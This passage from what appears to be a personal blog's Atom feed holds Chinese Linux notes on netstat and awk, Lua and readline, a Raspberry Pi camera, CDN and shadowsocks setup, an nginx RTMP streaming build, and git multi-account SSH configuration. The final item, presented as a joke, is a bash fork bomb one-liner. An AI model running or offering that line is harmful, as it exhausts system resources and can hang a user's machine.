output.</span><br></pre></td></tr></table></figure><ul><li>c文件生成的步骤</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C/C++文件经过预处理(preprocessing)、编译(compilation)、汇编(assembly)、和连接(linking)才能变成可执行文件。</span><br></pre></td></tr></table></figure><ul><li>查看已经建立的tcp链接数量，包括close_waite ,established,time_wait状态，</li><li>不会awk的时候感觉这是个什么东西orz</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -n | awk &apos;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&apos;</span><br></pre></td></tr></table></figure><h2 id="安装lua的时候-readline缺失"><a href="#安装lua的时候-readline缺失" class="headerlink" title="安装lua的时候 readline缺失"></a>安装lua的时候 readline缺失</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">安装一下 libreadline-dev，或者readline-dev，版本不一样有哪个装哪个</span><br></pre></td></tr></table></figure><h2 id="树莓派摄像头（非dsi口）"><a href="#树莓派摄像头（非dsi口）" class="headerlink" title="树莓派摄像头（非dsi口）"></a>树莓派摄像头（非dsi口）</h2><ul><li><p>可以这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mplayer -tv driver=v4l2:width=800:height=700:device=/dev/video1 tv://</span><br></pre></td></tr></table></figure></li><li><p>python调用的时候使用PiCamera库或者cv库，PiCamera可以测试下能不能用，毕竟两行代码，做视觉还是用cv了</p><h2 id="tx云cdn"><a href="#tx云cdn" class="headerlink" title="tx云cdn"></a>tx云cdn</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配置cdn</span><br><span class="line">源站信息： 自有源站，waynamigo.github.io</span><br><span class="line">回源配置： 回源host，waynamigo.cn</span><br></pre></td></tr></table></figure></li></ul><h3 id="发现使用shadowsocks还行，那个ssr扔了"><a href="#发现使用shadowsocks还行，那个ssr扔了" class="headerlink" title="发现使用shadowsocks还行，那个ssr扔了"></a>发现使用shadowsocks还行，那个ssr扔了</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sslocal -c /etc/shadowsocks/config.json -d start</span><br></pre></td></tr></table></figure><p>sslocal 直接用apt安装shadowsocks</p><h3 id="使用的"><a href="#使用的" class="headerlink" title="使用的"></a>使用的</h3><h3 id="流媒体搭建"><a href="#流媒体搭建" class="headerlink" title="流媒体搭建"></a>流媒体搭建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/arut/nginx-rtmp-module.git</span><br><span class="line"></span><br><span class="line">wget http://nginx.org/download/nginx-1.8.1.tar.gz </span><br><span class="line">tar -zxvf nginx-1.8.1.tar.gz </span><br><span class="line">cd nginx-1.8.1 </span><br><span class="line">先安装一下依赖</span><br><span class="line">yum install pcre-devel</span><br><span class="line">yum install zlib zlib-devel</span><br><span class="line">yum install openssl openssl-devel</span><br><span class="line"></span><br><span class="line">./configure --prefix=/usr/local/nginx  --add-module=../nginx-rtmp-module  --with-http_ssl_module   </span><br><span class="line">make </span><br><span class="line">make install</span><br></pre></td></tr></table></figure><ul><li>/usr/local/nginx/conf/nginx.conf</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">rtmp &#123;   </span><br><span class="line">     </span><br><span class="line">    server &#123;   </span><br><span class="line">     </span><br><span class="line">        listen 1935;  #监听的端口 </span><br><span class="line">     </span><br><span class="line">        chunk_size 4000;   </span><br><span class="line">           </span><br><span class="line">            </span><br><span class="line">        application hls &#123;  #rtmp推流请求路径 </span><br><span class="line">            live on;   </span><br><span class="line">            hls on;   </span><br><span class="line">            hls_path /usr/share/nginx/html/hls;   </span><br><span class="line">            hls_fragment 5s;   </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125; </span><br><span class="line">修改server模块的</span><br><span class="line">location / &#123; </span><br><span class="line">        root   /usr/share/nginx/html; </span><br><span class="line">        index  index.html index.htm; </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="git配置多用户"><a href="#git配置多用户" class="headerlink" title="git配置多用户"></a>git配置多用户</h3><p>.ssh/config</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    HostName github.com</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_qq</span><br><span class="line">    User nanamya</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd  .git</span><br><span class="line">设置本项目的用户名和邮箱</span><br><span class="line">git config user.name <span class="string">"yourname"</span></span><br><span class="line">git config user.email <span class="string">"youremail"</span></span><br><span class="line">如果重设 则：</span><br><span class="line">git config --global --unset user.name</span><br><span class="line">git config --global --unset user.email</span><br></pre></td></tr></table></figure><p>如果还是8行，检查一下，正常的话会有如下提示，否则会有debug的信息<br>ssh -vT <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a></p><ul><li>提示Hi waynamigo! You’ve successfully authenticated, but GitHub does not provide shell access.</li></ul><p>更换用户</p><h3 id="作死小能手"><a href="#作死小能手" class="headerlink" title="作死小能手"></a>作死小能手</h3><ul><li>:() { function :|:&amp; }; :</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;包括用linux自带openssl签postfix证书、流媒体证书按网上教程（找不到之类的问题，最后自己把证书试出来了，见第一部分，还有博客cdn换成tx云因为配置不一样导致好久没发现cdn没启用等尴尬的问题&lt;/p&gt;
    
    </summary>
    
      <category term="其他" scheme="http://waynamigo.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="Linux" scheme="http://waynamigo.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>NeuralRecon for 3D reconstruction in real-time</title>
    <link href="http://waynamigo.github.io/2019/04/01/2019-04-01-%E8%AF%84%E4%BC%B0%E6%A8%A1%E5%9E%8B%E7%AE%97%E6%B3%95%E6%8C%87%E6%A0%87%E7%9A%84%E8%AE%A1%E7%AE%97/"/>
    <id>http://waynamigo.github.io/2019/04/01/2019-04-01-评估模型算法指标的计算/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2021-06-24T03:22:12.945Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="深度学习" scheme="http://waynamigo.github.io/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="ML" scheme="http://waynamigo.github.io/tags/ML/"/>
    
      <category term="DL" scheme="http://waynamigo.github.io/tags/DL/"/>
    
      <category term="Object Detection" scheme="http://waynamigo.github.io/tags/Object-Detection/"/>
    
      <category term="Segmentation" scheme="http://waynamigo.github.io/tags/Segmentation/"/>
    
  </entry>
  
</feed>
